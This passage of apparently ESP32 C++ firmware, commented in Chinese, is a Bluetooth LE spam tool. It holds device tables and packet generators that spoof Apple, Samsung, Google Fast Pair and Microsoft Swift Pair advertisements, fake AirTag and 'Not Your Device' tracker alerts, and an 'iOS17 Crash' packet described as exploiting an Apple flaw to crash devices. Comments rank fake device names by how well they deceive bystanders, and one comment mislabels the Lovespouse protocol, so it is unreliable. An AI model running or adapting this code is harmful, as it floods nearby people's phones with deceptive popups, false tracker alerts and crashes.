  {"White & Black Buds2",        {0x2C, 0x67, 0x40}},
  {"Bronze Buds Live",           {0x3F, 0x67, 0x18}},
  {"Red Buds Live",              {0x42, 0xC5, 0x19}},
  {"Black & White Buds2",        {0xAE, 0x07, 0x3A}},
  {"Sleek Black Buds2",          {0x01, 0x17, 0x16}},
};
const int NUM_SAMSUNG_BUDS_DEVICES = sizeof(SAMSUNG_BUDS_DEVICES) / sizeof(SAMSUNG_BUDS_DEVICES[0]);

// ==================== Samsung Easy Setup Watch 设备列表 ====================
// 三星手表 Easy Setup 协议，触发三星手机的手表配对弹窗
// 结构: {设备名称, modelId[2]} - modelId 区分不同型号和尺寸的手表
const SamsungWatchDevice SAMSUNG_WATCH_DEVICES[] = {
  {"Fallback Watch",             {0x1A, 0x00}},
  {"Green Watch6 Classic 43m",   {0x20, 0x00}},
  {"Gold Watch5 40mm",           {0x14, 0x00}},
  {"White Watch4 Classic 44m",   {0x01, 0x00}},
  {"Black Watch4 Classic 40m",   {0x02, 0x00}},
  {"White Watch4 Classic 40m",   {0x03, 0x00}},
  {"Black Watch4 44mm",          {0x04, 0x00}},
  {"Silver Watch4 44mm",         {0x05, 0x00}},
  {"Green Watch4 44mm",          {0x06, 0x00}},
  {"Black Watch4 40mm",          {0x07, 0x00}},
  {"White Watch4 40mm",          {0x08, 0x00}},
  {"Gold Watch4 40mm",           {0x09, 0x00}},
  {"French Watch4",              {0x0A, 0x00}},
  {"French Watch4 Classic",      {0x0B, 0x00}},
  {"Fox Watch5 44mm",            {0x0C, 0x00}},
  {"Black Watch5 44mm",          {0x11, 0x00}},
  {"Sapphire Watch5 44mm",       {0x12, 0x00}},
  {"Purpleish Watch5 40mm",      {0x13, 0x00}},
  {"Black Watch5 Pro 45mm",      {0x15, 0x00}},
  {"Gray Watch5 Pro 45mm",       {0x16, 0x00}},
  {"White Watch5 44mm",          {0x17, 0x00}},
  {"White & Black Watch5",       {0x18, 0x00}},
  {"Black Watch6 Pink 40mm",     {0x1B, 0x00}},
  {"Gold Watch6 Gold 40mm",      {0x1C, 0x00}},
  {"Silver Watch6 Cyan 44mm",    {0x1D, 0x00}},
  {"Black Watch6 Classic 43m",   {0x1E, 0x00}},
};
const int NUM_SAMSUNG_WATCH_DEVICES = sizeof(SAMSUNG_WATCH_DEVICES) / sizeof(SAMSUNG_WATCH_DEVICES[0]);

// ==================== Fast Pair Debug 设备列表 ====================
// Fast Pair 调试模式设备，用于开发者调试和测试，包含各类测试用设备
const FastPairDevice FAST_PAIR_DEBUG_DEVICES[] = {
  {"Flipper Zero",               {0xD9, 0x9C, 0xA1}},
  {"Free Robux",                 {0x77, 0xFF, 0x67}},
  {"Free VBucks",                {0xAA, 0x18, 0x7F}},
  {"Rickroll",                   {0xDC, 0xE9, 0xEA}},
  {"Animated Rickroll",          {0x87, 0xB2, 0x5F}},
  {"Boykisser",                  {0xF3, 0x8C, 0x02}},
  {"BLM",                        {0x14, 0x48, 0xC9}},
  {"Xtreme",                     {0xD5, 0xAB, 0x33}},
  {"Xtreme Cta",                 {0x0C, 0x0B, 0x67}},
  {"Talking Sasquach",           {0x13, 0xB3, 0x9D}},
  {"ClownMaster",                {0xAA, 0x1F, 0xE1}},
  {"Obama",                      {0x7C, 0x6C, 0xDB}},
  {"Ryanair",                    {0x00, 0x5E, 0xF9}},
  {"FBI",                        {0xE2, 0x10, 0x6F}},
  {"Tesla",                      {0xB3, 0x7A, 0x62}},
};
const int NUM_FAST_PAIR_DEBUG_DEVICES = sizeof(FAST_PAIR_DEBUG_DEVICES) / sizeof(FAST_PAIR_DEBUG_DEVICES[0]);

// ==================== Fast Pair Non Production 设备列表 ====================
// Fast Pair 非生产环境设备，包含 Android Auto、测试设备等
const FastPairDevice FAST_PAIR_NON_PRODUCTION_DEVICES[] = {
  {"Android Auto",               {0x00, 0x00, 0x07}},
  {"Android Auto 2",             {0x07, 0x00, 0x00}},
  {"Anti-Spoof Test",            {0x00, 0x00, 0x0A}},
  {"Anti-Spoof Test 2",          {0x0A, 0x00, 0x00}},
  {"Arduino 101",                {0x00, 0x00, 0x47}},
  {"Arduino 101 2",              {0x47, 0x00, 0x00}},
  {"ATS2833_EVB",                {0x1E, 0x89, 0xA7}},
  {"Bisto CSR8670 Dev Board",    {0x00, 0x01, 0xF0}},
  {"BLE-Phone",                  {0x01, 0xE5, 0xCE}},
  {"Fast Pair Headphones",       {0x00, 0x00, 0x48}},
  {"Fast Pair Headphones 2",     {0x48, 0x00, 0x00}},
  {"Fast Pair Headphones 3",     {0x00, 0x00, 0x49}},
  {"Fast Pair Headphones 4",     {0x49, 0x00, 0x00}},
  {"Foocorp Foophones",          {0x00, 0x00, 0x08}},
  {"Foocorp Foophones 2",        {0x08, 0x00, 0x00}},
  {"Goodyear",                   {0x02, 0x00, 0xF0}},
  {"Goodyear 2",                 {0xF0, 0x00, 0x02}},
  {"Google Gphones",             {0x00, 0x00, 0x0B}},
  {"Google Gphones 2",           {0x0B, 0x00, 0x00}},
  {"Google Gphones 3",           {0x0C, 0x00, 0x00}},
  {"LG HBS1110",                 {0x00, 0x10, 0x00}},
  {"Smart Controller 1",         {0x00, 0xB7, 0x27}},
  {"Smart Setup",                {0x00, 0xF7, 0xD4}},
  {"T10",                        {0xF0, 0x04, 0x00}},
  {"Test 00000D",                {0x00, 0x00, 0x0D}},
  {"Test 000035",                {0x00, 0x00, 0x35}},
  {"Test 000035 2",              {0x35, 0x00, 0x00}},
  {"Test Android TV",            {0x00, 0x00, 0x09}},
  {"Test Android TV 2",          {0x09, 0x00, 0x00}},
};
const int NUM_FAST_PAIR_NON_PRODUCTION_DEVICES = sizeof(FAST_PAIR_NON_PRODUCTION_DEVICES) / sizeof(FAST_PAIR_NON_PRODUCTION_DEVICES[0]);

// ==================== Fast Pair Phone Setup 设备列表 ====================
// Fast Pair 手机设置设备，用于手机间的数据传输和快速设置（如 Google Gphones Transfer）
const FastPairDevice FAST_PAIR_PHONE_SETUP_DEVICES[] = {
  {"Google Gphones Transfer",    {0x00, 0x00, 0x0C}},
  {"Galaxy S23 Ultra",           {0x05, 0x77, 0xB1}},
  {"Galaxy S20+",                {0x05, 0xA9, 0xBC}},
};
const int NUM_FAST_PAIR_PHONE_SETUP_DEVICES = sizeof(FAST_PAIR_PHONE_SETUP_DEVICES) / sizeof(FAST_PAIR_PHONE_SETUP_DEVICES[0]);

// ==================== Lovespouse Play 设备列表 ====================
// Lovespouse 是一种蓝牙音箱控制协议，Play 指令用于触发音箱播放指定内容
// 结构: {设备名称, commandId[6]} - commandId 决定播放内容
const LovespouseDevice LOVESPOUSE_PLAY_DEVICES[] = {
  {"Classic 1",                  {0xE4, 0x9C, 0x6C, 0x00, 0x00, 0x00}},
  {"Classic 2",                  {0xE7, 0x07, 0x5E, 0x00, 0x00, 0x00}},
  {"Classic 3",                  {0xE6, 0x8E, 0x4F, 0x00, 0x00, 0x00}},
  {"Classic 4",                  {0xE1, 0x31, 0x3B, 0x00, 0x00, 0x00}},
  {"Classic 5",                  {0xE0, 0xB8, 0x2A, 0x00, 0x00, 0x00}},
  {"Classic 6",                  {0xE3, 0x23, 0x18, 0x00, 0x00, 0x00}},
  {"Classic 7",                  {0xE2, 0xAA, 0x09, 0x00, 0x00, 0x00}},
  {"Classic 8",                  {0xED, 0x5D, 0xF1, 0x00, 0x00, 0x00}},
  {"Classic 9",                  {0xEC, 0xD4, 0xE0, 0x00, 0x00, 0x00}},
  {"Independent 1-1",            {0xD4, 0x1F, 0x5D, 0x00, 0x00, 0x00}},
  {"Independent 1-2",            {0xD7, 0x84, 0x6F, 0x00, 0x00, 0x00}},
  {"Independent 1-3",            {0xD6, 0x0D, 0x7E, 0x00, 0x00, 0x00}},
  {"Independent 1-4",            {0xD1, 0xB2, 0x0A, 0x00, 0x00, 0x00}},
  {"Independent 1-5",            {0xD0, 0xB3, 0x1B, 0x00, 0x00, 0x00}},
  {"Independent 1-6",            {0xD3, 0xA0, 0x29, 0x00, 0x00, 0x00}},
  {"Independent 1-7",            {0xD2, 0x29, 0x38, 0x00, 0x00, 0x00}},
  {"Independent 1-8",            {0xDD, 0xDE, 0xC0, 0x00, 0x00, 0x00}},
  {"Independent 1-9",            {0xDC, 0x57, 0xD1, 0x00, 0x00, 0x00}},
  {"Independent 2-1",            {0xA4, 0x98, 0x2E, 0x00, 0x00, 0x00}},
  {"Independent 2-2",            {0xA7, 0x03, 0x1C, 0x00, 0x00, 0x00}},
  {"Independent 2-3",            {0xA6, 0x8A, 0x0D, 0x00, 0x00, 0x00}},
  {"Independent 2-4",            {0xA1, 0x35, 0x79, 0x00, 0x00, 0x00}},
  {"Independent 2-5",            {0xA0, 0xBC, 0x68, 0x00, 0x00, 0x00}},
  {"Independent 2-6",            {0xA3, 0x27, 0x5A, 0x00, 0x00, 0x00}},
  {"Independent 2-7",            {0xA2, 0xAE, 0x4B, 0x00, 0x00, 0x00}},
  {"Independent 2-8",            {0xAD, 0x59, 0xB3, 0x00, 0x00, 0x00}},
  {"Independent 2-9",            {0xAC, 0xD0, 0xA2, 0x00, 0x00, 0x00}},
};
const int NUM_LOVESPOUSE_PLAY_DEVICES = sizeof(LOVESPOUSE_PLAY_DEVICES) / sizeof(LOVESPOUSE_PLAY_DEVICES[0]);

// ==================== Lovespouse Stop 设备列表 ====================
// Lovespouse Stop 指令用于停止音箱当前播放的内容
const LovespouseDevice LOVESPOUSE_STOP_DEVICES[] = {
  {"Classic Stop",               {0xE5, 0x15, 0x7D, 0x00, 0x00, 0x00}},
  {"Independent 1 Stop",         {0xD5, 0x96, 0x4C, 0x00, 0x00, 0x00}},
  {"Independent 2 Stop",         {0xA5, 0x11, 0x3F, 0x00, 0x00, 0x00}},
};
const int NUM_LOVESPOUSE_STOP_DEVICES = sizeof(LOVESPOUSE_STOP_DEVICES) / sizeof(LOVESPOUSE_STOP_DEVICES[0]);

// ==================== Microsoft Swift Pair 设备列表 ====================
// Microsoft Swift Pair 协议，用于 Windows 设备的快速配对
const SwiftPairDevice SWIFT_PAIR_DEVICES[] = {
   // =====================================================
  //  第一梯队：微软生态亲儿子（触发率最高，推荐置顶）
  // =====================================================
  {"Surface Headset"},          // 微软官方耳机，弹窗自然
  {"Surface Earbuds"},          // 微软真无线耳机
  {"Xbox Headset"},             // 游戏玩家常用
  {"Xbox Wireless"},            // Xbox 无线适配器
  
  // =====================================================
  //  第二梯队：顶级音频设备（路人识别率高）
  // =====================================================
  {"Sony WH-1000XM5"},          // 索尼旗舰降噪
  {"Sony WF-1000XM5"},          // 索尼旗舰降噪豆
  {"Bose QC Ultra"},            // 博士新旗舰
  {"Bose QuietComfort 45"},     // 博士经典款（注意字数 19，恰好）
  {"JBL Tune 770NC"},           // 主打款，识别度高
  {"Sennheiser HD 450BT"},      // 森海塞尔口碑款（19字符）
  {"Audio-Technica ATH"},       // 铁三角经典系列
  
  // =====================================================
  //  第三梯队：办公生产力设备（白领常用）
  // =====================================================
  {"Logitech MX Master"},       // 办公鼠标王者
  {"Logitech MX Anywhere"},     // 便携办公鼠标（注意字数 20，刚好）
  {"Logitech G Pro"},           // 游戏鼠标
  {"Dell Premier Headset"},     // 戴尔商务耳机（19字符）
  {"HP Elite Headset"},         // HP 商务耳机
  {"Lenovo Earbuds"},  // 联想 ThinkPad 配套耳机
  

  // =====================================================
  //  第四梯队：手机厂商生态产品（识别度高）
  // =====================================================
  {"Galaxy Buds FE"},           // 三星用户群庞大
  {"Galaxy Buds2 Pro"},         // 三星新旗舰（注意：17字符，合适）
  {"Pixel Buds Pro"},           // 谷歌生态（14字符）
  {"Nothing Ear 2"},            // 热门网红耳机（13字符）
  {"OnePlus Buds Pro"},         // 一加用户群（注意：15字符）
  {"Xiaomi Buds 4"},            // 小米用户群（12字符）
  {"OPPO Enco X2"},             // OPPO 用户群（13字符）

  // =====================================================
  //  第五梯队：笔记本电脑常见蓝牙标识（超级逼真）
  // =====================================================
  {"Samsung Galaxy Book"},      // 三星笔记本
  {"Dell XPS 15"},              // 戴尔 XPS 系列
  {"HP Spectre x360"},          // 惠普高端本（注意 16 字符，合适）
  {"Lenovo Yoga 9i"},           // 联想高端本（14字符）
  {"Surface Laptop 5"},         // 微软自家笔记本（18字符）
  {"MacBook Pro"},              // 苹果生态混入（12字符，但要注意 Windows 上显示这个名称能混淆视听）

  // =====================================================
  //  第六梯队：游戏外设（极客标识）
  // =====================================================
  {"Razer BlackShark"},         // 雷蛇游戏耳机（16字符）
  {"SteelSeries Arctis"},       // 赛睿游戏耳机（注意 19 字符，合适）
  {"Corsair HS80"},             // 海盗船游戏耳机（13字符）
  {"Logitech G735"},            // 罗技游戏耳机（13字符）
  {"Device 1"},
  {"Device 2"},
  {"Device 3"},
  {"Device 4"},
  {"Device 5"},
  {"Device 6"},
  {"Device 7"},
  {"Device 8"},
  {"Device 9"},
  {"Device 10"},
};
const int NUM_SWIFT_PAIR_DEVICES = sizeof(SWIFT_PAIR_DEVICES) / sizeof(SWIFT_PAIR_DEVICES[0]);

// ==================== 苹果BLE广播包生成器 ====================
// 根据设备类型生成 Apple Audio 或 Apple Setup 广播包
// Apple Audio (31字节): 用于 AirPods/Beats 等音频设备
// Apple Setup (23字节): 用于 AppleTV/iPhone/ HomePod 等设置设备
void generatePacket(const AppleDevice& device, uint8_t* buffer, size_t& outLength) {
  const uint8_t s = device.bodySeed;       // 体部数据种子，用于生成唯一标识
  const bool isAudio = (device.type == APPLE_AUDIO);

  if (isAudio) {
    // ========== Apple Audio 广播包（31字节） ==========
    outLength = APPLE_AUDIO_PACKET_LEN;
    buffer[0] = 0x1E;
    buffer[1] = 0xFF;
    buffer[2] = APPLE_MANU_ID_LOW;
    buffer[3] = APPLE_MANU_ID_HIGH;
    buffer[4] = 0x07;
    buffer[5] = 0x19;
    buffer[6] = 0x07;
    buffer[7] = device.modelId;
    
    buffer[8]  = 0x20 | (s & 0x0F);
    buffer[9]  = ((0x75 ^ (s * 7)) & 0x7F) | 0x01;
    buffer[10] = (0xAA ^ (s * 13)) & 0xFF;
    buffer[11] = 0x30 | ((s >> 2) & 0x0F);
    buffer[12] = 0x01 | ((s & 0x03) << 2);
    buffer[15] = (0x45 ^ (s * 17)) & 0xFF;
    buffer[16] = 0x12 | ((s >> 4) & 0x0F);
    buffer[17] = 0x12 ^ ((s * 23) & 0x0F);
    buffer[18] = 0x12 ^ ((s * 29) & 0x0F);
    
    buffer[19] = (uint8_t)esp_random();
    buffer[20] = (uint8_t)esp_random();
    
    for (size_t i = 21; i < APPLE_AUDIO_PACKET_LEN; i++) {
      buffer[i] = (uint8_t)esp_random();
    }
  } else {
    // ========== Apple Setup 广播包（23字节） ==========
    outLength = APPLE_SETUP_PACKET_LEN;
    buffer[0]  = 0x16;
    buffer[1]  = 0xFF;
    buffer[2]  = APPLE_MANU_ID_LOW;
    buffer[3]  = APPLE_MANU_ID_HIGH;
    buffer[4]  = 0x04;
    buffer[5]  = 0x04;
    buffer[6]  = 0x2A;
    buffer[7]  = 0x00;
    buffer[8]  = 0x00;
    buffer[9]  = 0x00;
    buffer[10] = 0x0F;
    buffer[11] = 0x05;
    // 根据 modelId 动态设置 flag（参照 Android 原版逻辑）
    uint8_t flag = 0xC0;
    if (device.modelId == 0x20) {
      flag = (esp_random() & 0x01) ? 0xBF : 0xC0;
    } else if (device.modelId == 0x09) {
      flag = (esp_random() & 0x01) ? 0x40 : 0xC0;
    } else if (device.modelId == 0x21) {
      flag = 0x40;
    }
    buffer[12] = flag;
    buffer[13] = device.modelId;
    
    buffer[14] = ((0x60 ^ (s * 11)) & 0xFF) | 0x01;
    buffer[15] = (0x4C ^ (s * 19)) & 0xFF;
    buffer[16] = (0x95 ^ (s * 31)) & 0xFF;
    buffer[19] = 0x10 | (s & 0x0F);
    buffer[17] = (uint8_t)esp_random() & 0x0F;
    
    for (size_t i = 18; i < APPLE_SETUP_PACKET_LEN; i++) {
      if (i != 19) buffer[i] = (uint8_t)esp_random();
    }
  }
}

// ==================== Google Fast Pair 广播包生成器 ====================
// Google Fast Pair 协议广播包（7字节），用于 Android 设备的快速配对
// 包结构: Service Data AD Structure (UUID = 0xFE2C, data = 3字节 Model ID)
void generateFastPairPacket(const FastPairDevice& device, uint8_t* buffer, size_t& outLength) {
  buffer[0] = 0x05;                    // Length: 5字节数据（不含长度和类型）
  buffer[1] = 0x16;                    // Type: Service Data - 16-bit UUID
  buffer[2] = FP_SERVICE_UUID_1;      // Fast Pair UUID 低字节 (0x2C)
  buffer[3] = FP_SERVICE_UUID_2;      // Fast Pair UUID 高字节 (0xFE)
  buffer[4] = device.modelId[0];      // modelId 字节1
  buffer[5] = device.modelId[1];      // modelId 字节2
  buffer[6] = device.modelId[2];      // modelId 字节3
  outLength = FAST_PAIR_PACKET_LEN;
}

// ==================== 用户自定义设备广播包生成器 ====================
// 复用 AppleDevice 的生成逻辑，方便用户添加自定义设备
void generateCustomPacket(const CustomDevice& device, uint8_t* buffer, size_t& outLength) {
  generatePacket(device, buffer, outLength);
}

// ==================== Apple Continuity Action Modal 广播包生成器 ====================
// Action Modal 协议广播包（11字节），模拟NFC扫描效果，触发系统级弹窗
void generateAppleActionModalPacket(const AppleActionModalDevice& device, uint8_t* buffer, size_t& outLength) {
  outLength = APPLE_ACTION_MODAL_LEN;
  buffer[0] = 0x09;                    // Length: 9字节厂商数据
  buffer[1] = 0xFF;                    // Type: 厂商特定数据
  buffer[2] = APPLE_MANU_ID_LOW;       // Company ID 低字节 (0x4C)
  buffer[3] = APPLE_MANU_ID_HIGH;      // Company ID 高字节 (0x00)
  buffer[4] = 0x0F;                    // Apple 子类型: Action Modal
  buffer[5] = 0x05;                    // Apple 长度: 5字节
  
  uint8_t action = device.actionId[0];
  uint8_t flag = 0xC0;
  // 根据 actionId 动态调整 flag（模拟真实设备行为）
  if (action == 0x20 && (esp_random() & 0x01)) {
    flag = 0xBF;
  } else if (action == 0x09 && (esp_random() & 0x01)) {
    flag = 0x40;
  } else if (action == 0x21) {
    flag = 0x40;
  }
  buffer[6] = flag;                    // Flag 字节
  buffer[7] = action;                  // Action ID（决定弹窗内容）
  // 剩余字节填充随机数据
  buffer[8] = (uint8_t)esp_random();
  buffer[9] = (uint8_t)esp_random();
  buffer[10] = (uint8_t)esp_random();
}

// ==================== Apple Continuity iOS17 Crash 广播包生成器 ====================
// iOS17 Crash 协议广播包（18字节），利用苹果系统漏洞导致设备崩溃
// 包格式与 Action Modal 类似，但增加了额外的 payload 数据触发漏洞
void generateAppleIos17CrashPacket(const AppleIos17CrashDevice& device, uint8_t* buffer, size_t& outLength) {
  outLength = APPLE_IOS17_CRASH_LEN;
  buffer[0] = 0x0C;                    // Length: 12字节厂商数据
  buffer[1] = 0xFF;                    // Type: 厂商特定数据
  buffer[2] = APPLE_MANU_ID_LOW;       // Company ID 低字节 (0x4C)
  buffer[3] = APPLE_MANU_ID_HIGH;      // Company ID 高字节 (0x00)
  buffer[4] = 0x0F;                    // Apple 子类型: Action Modal
  buffer[5] = 0x05;                    // Apple 长度: 5字节
  
  uint8_t action = device.actionId[0];
  uint8_t flag = 0xC0;
  // 根据 actionId 动态调整 flag
  if (action == 0x20 && (esp_random() & 0x01)) {
    flag = 0xBF;
  } else if (action == 0x09 && (esp_random() & 0x01)) {
    flag = 0x40;
  }
  buffer[6] = flag;                    // Flag 字节
  buffer[7] = action;                  // Action ID
  // 填充随机数据和漏洞触发 payload
  buffer[8] = (uint8_t)esp_random();
  buffer[9] = (uint8_t)esp_random();
  buffer[10] = (uint8_t)esp_random();
  buffer[11] = 0x00;
  buffer[12] = 0x00;
  buffer[13] = 0x10;                   // 漏洞触发字节
  buffer[14] = (uint8_t)esp_random();
  buffer[15] = (uint8_t)esp_random();
  buffer[16] = (uint8_t)esp_random();
}

// ==================== Apple Airtag 广播包生成器 ====================
// Airtag 协议广播包（31字节），触发 iPhone 的"查找"弹窗
void generateAppleAirtagPacket(const AppleAirtagDevice& device, uint8_t* buffer, size_t& outLength) {
  outLength = APPLE_AIRTAG_PACKET_LEN;
  buffer[0] = 0x1E;                    // Length: 30字节厂商数据
  buffer[1] = 0xFF;                    // Type: 厂商特定数据
  buffer[2] = APPLE_MANU_ID_LOW;       // Company ID 低字节 (0x4C)
  buffer[3] = APPLE_MANU_ID_HIGH;      // Company ID 高字节 (0x00)
  buffer[4] = 0x07;                    // Apple 子类型: Audio (与Airtag共用)
  buffer[5] = 0x19;                    // Apple 长度: 25字节
  buffer[6] = 0x05;                    // Prefix: AIRTAG
  buffer[7] = device.modelId[0];      // 设备型号 ID 字节1
  buffer[8] = device.modelId[1];      // 设备型号 ID 字节2
  buffer[9] = 0x55;                    // Status 字节（必须为0x55才能触发查找弹窗）
  
  // 随机生成电量信息（模拟真实 Airtag）
  uint8_t batteryLevel = ((esp_random() % 10) << 4) | (esp_random() % 10);
  buffer[10] = batteryLevel;
  
  uint8_t caseLevel = ((esp_random() % 8) << 4) | (esp_random() % 10);
  buffer[11] = caseLevel;
  
  uint8_t lidCounter = esp_random() % 256;
  buffer[12] = lidCounter;
  
  buffer[13] = device.modelId[2];      // 颜色值
  buffer[14] = 0x00;                    // 固定字节
  
  // 剩余字节填充随机数据（16字节）
  for (size_t i = 15; i < APPLE_AIRTAG_PACKET_LEN; i++) {
    buffer[i] = (uint8_t)esp_random();
  }
}

// ==================== Apple Not Your Device 广播包生成器 ====================
// Not Your Device 协议广播包（31字节），触发 iPhone 的"这不是你的设备"弹窗
// 用于追踪未知设备，包含颜色信息（通过 modelId 和 bodySeed 区分）
void generateAppleNotYourDevicePacket(const AppleNotYourDevice& device, uint8_t* buffer, size_t& outLength) {
  outLength = APPLE_NOT_YOUR_DEVICE_LEN;
  buffer[0] = 0x1E;                    // Length: 30字节厂商数据
  buffer[1] = 0xFF;                    // Type: 厂商特定数据
  buffer[2] = APPLE_MANU_ID_LOW;       // Company ID 低字节 (0x4C)
  buffer[3] = APPLE_MANU_ID_HIGH;      // Company ID 高字节 (0x00)
  buffer[4] = 0x07;                    // Apple 子类型: Audio
  buffer[5] = 0x19;                    // Apple 长度: 25字节
  buffer[6] = 0x01;                    // Prefix: NOT YOUR DEVICE
  buffer[7] = device.modelId[0];      // 设备型号 ID 字节1（含颜色信息）
  buffer[8] = device.modelId[1];      // 设备型号 ID 字节2
  buffer[9] = 0x55;                    // Status 字节
  // 随机生成电量信息（完全随机化，更接近真实设备行为）
  buffer[10] = ((esp_random() % 10) << 4) | (esp_random() % 10);
  buffer[11] = ((esp_random() % 8) << 4) | (esp_random() % 10);
  buffer[12] = (uint8_t)esp_random();     // lidOpenCounter
  buffer[13] = device.modelId[2];      // 颜色值
  buffer[14] = 0x00;                    // 固定字节
  // 剩余字节填充随机数据（16字节）
  for (size_t i = 15; i < APPLE_NOT_YOUR_DEVICE_LEN; i++) {
    buffer[i] = (uint8_t)esp_random();
  }
}

// ==================== Samsung Easy Setup Buds 广播包生成器 ====================
// Samsung Easy Setup 协议广播包（30字节），用于三星蓝牙耳机的快速配对弹窗
void generateSamsungBudsPacket(const SamsungBudsDevice& device, uint8_t* buffer, size_t& outLength) {
  outLength = SAMSUNG_BUDS_PACKET_LEN;
  buffer[0] = 0x1D;                    // Length: 29字节厂商数据
  buffer[1] = 0xFF;                    // Type: 厂商特定数据
  buffer[2] = SAMSUNG_MANU_ID_LOW;     // Company ID 低字节 (0x75)
  buffer[3] = SAMSUNG_MANU_ID_HIGH;    // Company ID 高字节 (0x00)
  buffer[4] = 0x42;                    // Samsung 子类型: Easy Setup
  buffer[5] = 0x09;                    // Length
  buffer[6] = 0x81;                    // Flags
  buffer[7] = 0x02;                    // Device Type: Buds
  buffer[8] = 0x14;                    // Version
  buffer[9] = 0x15;                    // Subversion
  buffer[10] = 0x03;                   // modelId 长度
  buffer[11] = 0x21;                   // Data Type
  buffer[12] = 0x01;                   // Payload Type
  buffer[13] = 0x09;                   // Name Length
  buffer[14] = device.modelId[0];      // modelId 字节1
  buffer[15] = device.modelId[1];      // modelId 字节2
  buffer[16] = 0x01;                   // Reserved
  buffer[17] = device.modelId[2];      // modelId 字节3
  buffer[18] = 0x06;                   // Data Length
  buffer[19] = 0x3C;                   // UUID Length
  // 随机填充数据
  buffer[20] = (uint8_t)esp_random();
  buffer[21] = (uint8_t)esp_random();
  buffer[22] = 0x00;
  buffer[23] = 0x00;
  buffer[24] = 0x00;
  buffer[25] = 0x00;
  buffer[26] = (uint8_t)esp_random();
  buffer[27] = 0x00;
  buffer[28] = 0x16;
  buffer[29] = 0xFF;
}

// ==================== Samsung Easy Setup Watch 广播包生成器 ====================
// Samsung Easy Setup 协议广播包（15字节），用于三星手表的快速配对弹窗
void generateSamsungWatchPacket(const SamsungWatchDevice& device, uint8_t* buffer, size_t& outLength) {
  outLength = SAMSUNG_WATCH_PACKET_LEN;
  buffer[0] = 0x0B;                    // Length: 11字节厂商数据
  buffer[1] = 0xFF;                    // Type: 厂商特定数据
  buffer[2] = SAMSUNG_MANU_ID_LOW;     // Company ID 低字节 (0x75)
  buffer[3] = SAMSUNG_MANU_ID_HIGH;    // Company ID 高字节 (0x00)
  buffer[4] = 0x01;                    // Samsung 子类型
  buffer[5] = 0x00;                    // Reserved
  buffer[6] = 0x02;                    // Device Type: Watch
  buffer[7] = 0x00;                    // Reserved
  buffer[8] = 0x01;                    // Flags
  buffer[9] = 0x01;                    // Data Type
  buffer[10] = 0xFF;                   // Length
  buffer[11] = 0x00;                   // Reserved
  buffer[12] = 0x00;                   // Reserved
  buffer[13] = 0x43;                   // Version
  buffer[14] = device.modelId[0];      // modelId
}

// ==================== Lovespouse 广播包生成器 ====================
// Lovespouse 协议广播包（25字节），用于蓝牙音箱的播放控制指令
void generateLovespousePacket(const LovespouseDevice& device, uint8_t* buffer, size_t& outLength) {
  outLength = LOVESPOUSE_PACKET_LEN;
  buffer[0] = 0x18;                    // Length: 24字节厂商数据
  buffer[1] = 0xFF;                    // Type: 厂商特定数据
  buffer[2] = LOVESPOUSE_MANU_ID_LOW; // Company ID 低字节 (0x6D)
  buffer[3] = LOVESPOUSE_MANU_ID_HIGH;// Company ID 高字节 (0x00)
  // 固定协议头部（FF FF 00 6D...，与 Kotlin 参考代码一致）
  buffer[4] = 0xFF;
  buffer[5] = 0xFF;
  buffer[6] = 0x00;
  buffer[7] = 0x6D;
  buffer[8] = 0xB6;
  buffer[9] = 0x43;
  buffer[10] = 0xCE;
  buffer[11] = 0x97;
  buffer[12] = 0xFE;
  buffer[13] = 0x42;
  buffer[14] = 0x7C;
  // 指令ID（决定播放内容）
  buffer[15] = device.commandId[0];
  buffer[16] = device.commandId[1];
  buffer[17] = device.commandId[2];
  // 固定协议尾部
  buffer[18] = 0x03;
  buffer[19] = 0x03;
  buffer[20] = 0x8F;
  buffer[21] = 0xAE;
  // 剩余字节填充随机数据
  for (size_t i = 22; i < LOVESPOUSE_PACKET_LEN; i++) {
    buffer[i] = (uint8_t)esp_random();
  }
}

// ==================== Microsoft Swift Pair 广播包生成器 ====================
// Microsoft Swift Pair 协议广播包（变长），用于 Windows 设备的快速配对
// 包长度取决于设备名称长度，最大约 30 字节
void generateSwiftPairPacket(const SwiftPairDevice& device, uint8_t* buffer, size_t& outLength) {
  size_t nameLen = strlen(device.name);
  const size_t maxNameLen = 20;          // 设备名称最大长度限制
  if (nameLen > maxNameLen) nameLen = maxNameLen;  // 长度截断保护
  size_t payloadLen = 2 + 3 + nameLen;  // 厂商ID(2) + 头部(3) + 名称
  outLength = 1 + payloadLen;           // Length字节 + payload
  
  buffer[0] = (uint8_t)payloadLen;       // Length
  buffer[1] = 0xFF;                      // Type: 厂商特定数据
  buffer[2] = MICROSOFT_MANU_ID_LOW;     // Company ID 低字节
  buffer[3] = MICROSOFT_MANU_ID_HIGH;    // Company ID 高字节
  buffer[4] = 0x03;                      // Swift Pair 子类型
  buffer[5] = 0x00;                      // Version
  buffer[6] = 0x80;                      // Flags
  
  // 填充设备名称
  for (size_t i = 0; i < nameLen; i++) {
    buffer[7 + i] = device.name[i];
  }
}